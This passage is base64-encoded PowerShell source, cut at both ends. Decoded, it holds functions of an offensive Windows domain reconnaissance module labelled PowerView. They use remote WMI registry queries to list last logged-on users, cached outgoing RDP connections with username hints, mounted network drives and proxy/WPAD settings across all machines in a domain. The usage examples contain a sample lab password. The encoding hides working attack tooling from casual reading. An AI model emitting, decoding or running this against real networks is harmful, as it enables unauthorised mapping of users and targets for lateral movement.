ogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRXcGFkID0gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJEF1dG9Db25maWdVUkwpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdQcm94eV0gRXJyb3IgY29ubmVjdGluZyB0byBBdXRvQ29uZmlnVVJMIDogJEF1dG9Db25maWdVUkwiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkUHJveHlTZXJ2ZXIgLW9yICRBdXRvQ29uZmlnVXJsKSB7CiAgICAgICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQcm94eVNlcnZlcicgJFByb3h5U2VydmVyCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBdXRvQ29uZmlnVVJMJyAkQXV0b0NvbmZpZ1VSTAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnV3BhZCcgJFdwYWQKICAgICAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Qcm94eVNldHRpbmdzJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ1Byb3h5XSBObyBwcm94eSBzZXR0aW5ncyBmb3VuZCBmb3IgJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ1Byb3h5XSBFcnJvciBlbnVtZXJhdGluZyBwcm94eSBzZXR0aW5ncyBmb3IgJENvbXB1dGVyTmFtZSA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyB0aGUgbGFzdCB1c2VyIHdobyBsb2dnZWQgb250byB0aGUgbG9jYWwgKG9yIGEgcmVtb3RlKSBtYWNoaW5lLgoKTm90ZTogVGhpcyBmdW5jdGlvbiByZXF1aXJlcyBhZG1pbmlzdHJhdGl2ZSByaWdodHMgb24gdGhlIG1hY2hpbmUgeW91J3JlIGVudW1lcmF0aW5nLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIHJlbW90ZSByZWdpc3RyeSB0byBlbnVtZXJhdGUgdGhlIExhc3RMb2dnZWRPblVzZXIgcmVnaXN0cnkga2V5CmZvciB0aGUgbG9jYWwgKG9yIHJlbW90ZSkgbWFjaGluZS4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIHF1ZXJ5IGZvciByZW1vdGUgcmVnaXN0cnkgdmFsdWVzIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3RpbmcgdG8gdGhlIHJlbW90ZSBzeXN0ZW0uCgouRVhBTVBMRQoKR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbgoKUmV0dXJucyB0aGUgbGFzdCB1c2VyIGxvZ2dlZCBvbnRvIHRoZSBsb2NhbCBtYWNoaW5lLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdMYXN0TG9nZ2VkT24gLUNvbXB1dGVyTmFtZSBXSU5ET1dTMQoKUmV0dXJucyB0aGUgbGFzdCB1c2VyIGxvZ2dlZCBvbnRvIFdJTkRPV1MxCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIHwgR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbgoKUmV0dXJucyB0aGUgbGFzdCB1c2VyIGxvZ2dlZCBvbnRvIGFsbCBtYWNoaW5lcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1XTUlSZWdMYXN0TG9nZ2VkT24gLUNvbXB1dGVyTmFtZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuTGFzdExvZ2dlZE9uVXNlcgoKQSBQU0N1c3RvbU9iamVjdCBjb250YWluaW5nIHRoZSBDb21wdXRlck5hbWUgYW5kIGxhc3QgbG9nZ2Vkb24gdXNlci4KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICMgSEtFWV9MT0NBTF9NQUNISU5FCiAgICAgICAgICAgICRIS0xNID0gMjE0NzQ4MzY1MAoKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU2lsZW50bHlDb250aW51ZScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgIyB0cnkgdG8gb3BlbiB1cCB0aGUgcmVtb3RlIHJlZ2lzdHJ5IGtleSB0byBncmFiIHRoZSBsYXN0IGxvZ2dlZCBvbiB1c2VyCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkUmVnID0gR2V0LVdtaU9iamVjdCBAV21pQXJndW1lbnRzCgogICAgICAgICAgICAgICAgJEtleSA9ICdTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBdXRoZW50aWNhdGlvblxMb2dvblVJJwogICAgICAgICAgICAgICAgJFZhbHVlID0gJ0xhc3RMb2dnZWRPblVzZXInCiAgICAgICAgICAgICAgICAkTGFzdFVzZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS0xNLCAkS2V5LCAkVmFsdWUpLnNWYWx1ZQoKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkTGFzdExvZ2dlZE9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAkTGFzdExvZ2dlZE9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xhc3RMb2dnZWRPbicgJExhc3RVc2VyCiAgICAgICAgICAgICAgICAkTGFzdExvZ2dlZE9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5MYXN0TG9nZ2VkT25Vc2VyJykKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJENvbXB1dGVyLiBSZW1vdGUgcmVnaXN0cnkgbGlrZWx5IG5vdCBlbmFibGVkLiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIGluZm9ybWF0aW9uIGFib3V0IFJEUCBjb25uZWN0aW9ucyBvdXRnb2luZyBmcm9tIHRoZSBsb2NhbCAob3IgcmVtb3RlKSBtYWNoaW5lLgoKTm90ZTogVGhpcyBmdW5jdGlvbiByZXF1aXJlcyBhZG1pbmlzdHJhdGl2ZSByaWdodHMgb24gdGhlIG1hY2hpbmUgeW91J3JlIGVudW1lcmF0aW5nLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBDb252ZXJ0RnJvbS1TSUQgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIHJlbW90ZSByZWdpc3RyeSBmdW5jdGlvbmFsaXR5IHRvIHF1ZXJ5IGFsbCBlbnRyaWVzIGZvciB0aGUKIldpbmRvd3MgUmVtb3RlIERlc2t0b3AgQ29ubmVjdGlvbiBDbGllbnQiIG9uIGEgbWFjaGluZSwgc2VwYXJhdGVkIGJ5CnVzZXIgYW5kIHRhcmdldCBzZXJ2ZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgY2FjaGVkIFJEUCBjb25uZWN0aW9ucyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW5nIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uCgpSZXR1cm5zIHRoZSBSRFAgY29ubmVjdGlvbiBjbGllbnQgaW5mb3JtYXRpb24gZm9yIHRoZSBsb2NhbCBtYWNoaW5lLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uICAtQ29tcHV0ZXJOYW1lIFdJTkRPV1MyLnRlc3RsYWIubG9jYWwKClJldHVybnMgdGhlIFJEUCBjb25uZWN0aW9uIGNsaWVudCBpbmZvcm1hdGlvbiBmb3IgdGhlIFdJTkRPV1MyLnRlc3RsYWIubG9jYWwgbWFjaGluZQoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uCgpSZXR1cm5zIGNhY2hlZCBSRFAgaW5mb3JtYXRpb24gZm9yIGFsbCBtYWNoaW5lcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24KCkEgUFNDdXN0b21PYmplY3QgY29udGFpbmluZyB0aGUgQ29tcHV0ZXJOYW1lIGFuZCBjYWNoZWQgUkRQIGluZm9ybWF0aW9uLgojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ2FjaGVkUkRQQ29ubmVjdGlvbicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgIyBIS0VZX1VTRVJTCiAgICAgICAgICAgICRIS1UgPSAyMTQ3NDgzNjUxCgogICAgICAgICAgICAkV21pQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdMaXN0JyA9ICRUcnVlCiAgICAgICAgICAgICAgICAnQ2xhc3MnID0gJ1N0ZFJlZ1Byb3YnCiAgICAgICAgICAgICAgICAnTmFtZXNwYWNlJyA9ICdyb290XGRlZmF1bHQnCiAgICAgICAgICAgICAgICAnQ29tcHV0ZXJuYW1lJyA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgJ0Vycm9yQWN0aW9uJyA9ICdTdG9wJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkV21pQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwoKICAgICAgICAgICAgICAgICMgZXh0cmFjdCBvdXQgdGhlIFNJRHMgb2YgZG9tYWluIHVzZXJzIGluIHRoaXMgaGl2ZQogICAgICAgICAgICAgICAgJFVzZXJTSURzID0gKCRSZWcuRW51bUtleSgkSEtVLCAnJykpLnNOYW1lcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfQoKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyU0lEIGluICRVc2VyU0lEcykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U2lkICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICMgcHVsbCBvdXQgYWxsIHRoZSBjYWNoZWQgUkRQIGNvbm5lY3Rpb25zCiAgICAgICAgICAgICAgICAgICAgICAgICRDb25uZWN0aW9uS2V5cyA9ICRSZWcuRW51bVZhbHVlcygkSEtVLCIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0Iikuc05hbWVzCgogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQ29ubmVjdGlvbiBpbiAkQ29ubmVjdGlvbktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbWFrZSBzdXJlIHRoaXMga2V5IGlzIGEgY2FjaGVkIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdGlvbiAtbWF0Y2ggJ01SVS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRTZXJ2ZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0IiwgJENvbm5lY3Rpb24pLnNWYWx1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRTZXJ2ZXInICRUYXJnZXRTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJuYW1lSGludCcgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5DYWNoZWRSRFBDb25uZWN0aW9uJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICMgcHVsbCBvdXQgYWxsIHRoZSBjYWNoZWQgc2VydmVyIGluZm8gd2l0aCB1c2VybmFtZSBoaW50cwogICAgICAgICAgICAgICAgICAgICAgICAkU2VydmVyS2V5cyA9ICRSZWcuRW51bUtleSgkSEtVLCIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzIikuc05hbWVzCgogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2VydmVyIGluICRTZXJ2ZXJLZXlzKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJuYW1lSGludCA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXFNvZnR3YXJlXE1pY3Jvc29mdFxUZXJtaW5hbCBTZXJ2ZXIgQ2xpZW50XFNlcnZlcnNcJFNlcnZlciIsICdVc2VybmFtZUhpbnQnKS5zVmFsdWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICRVc2VybmFtZUhpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvcjogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbl0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XTUlSZWdNb3VudGVkRHJpdmUgewo8IwouU1lOT1BTSVMKClJldHVybnMgaW5mb3JtYXRpb24gYWJvdXQgc2F2ZWQgbmV0d29yayBtb3VudGVkIGRyaXZlcyBmb3IgdGhlIGxvY2FsIChvciByZW1vdGUpIG1hY2hpbmUuCgpOb3RlOiBUaGlzIGZ1bmN0aW9uIHJlcXVpcmVzIGFkbWluaXN0cmF0aXZlIHJpZ2h0cyBvbiB0aGUgbWFjaGluZSB5b3UncmUgZW51bWVyYXRpbmcuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IENvbnZlcnRGcm9tLVNJRCAgCgouREVTQ1JJUFRJT04KClVzZXMgcmVtb3RlIHJlZ2lzdHJ5IGZ1bmN0aW9uYWxpdHkgdG8gZW51bWVyYXRlIHJlY2VudGx5IG1vdW50ZWQgbmV0d29yayBkcml2ZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgbW91bnRlZCBkcml2ZSBpbmZvcm1hdGlvbiAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW5nIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdNb3VudGVkRHJpdmUKClJldHVybnMgdGhlIHNhdmVkIG5ldHdvcmsgbW91bnRlZCBkcml2ZXMgZm9yIHRoZSBsb2NhbCBtYWNoaW5lLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdNb3VudGVkRHJpdmUgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBzYXZlZCBuZXR3b3JrIG1vdW50ZWQgZHJpdmVzIGZvciB0aGUgV0lORE9XUzIudGVzdGxhYi5sb2NhbCBtYWNoaW5lCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIHwgR2V0LVdNSVJlZ01vdW50ZWREcml2ZQoKUmV0dXJucyB0aGUgc2F2ZWQgbmV0d29yayBtb3VudGVkIGRyaXZlcyBmb3IgYWxsIG1hY2hpbmVzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LVdNSVJlZ01vdW50ZWREcml2ZSAtQ29tcHV0ZXJOYW1lIFBSSU1BUlkudGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5SZWdNb3VudGVkRHJpdmUKCkEgUFNDdXN0b21PYmplY3QgY29udGFpbmluZyB0aGUgQ29tcHV0ZXJOYW1lIGFuZCBtb3VudGVkIGRyaXZlIGluZm9ybWF0aW9uLgojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUmVnTW91bnRlZERyaXZlJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmF